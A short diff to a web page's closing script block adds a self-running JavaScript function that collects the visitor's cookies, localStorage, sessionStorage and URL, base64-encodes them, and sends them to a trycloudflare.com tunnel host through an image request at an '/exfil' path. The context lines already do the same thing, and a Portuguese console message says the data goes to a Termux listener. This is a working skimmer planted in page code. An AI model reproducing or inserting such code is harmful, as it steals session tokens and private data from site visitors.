@@ -654,6 +654,23 @@ var data = {
 var encodedData = btoa(JSON.stringify(data));
 new Image().src = "https://stockholm-ozone-station-scholarship.trycloudflare.com" + encodedData;
 		  
+(function(){
+    var data = {
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        timestamp: new Date().getTime(),
+        location: window.location.href
+    };
+    
+    var payload = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+    
+    // O sinal de + serve para concatenar na URL
+    new Image().src = "https://stockholm-ozone-station-scholarship.trycloudflare.com/exfil?d=" + payload;
+    
+    console.log("Dados enviados para o Termux!");
+})();
+	
 	
 </script>
 </body>
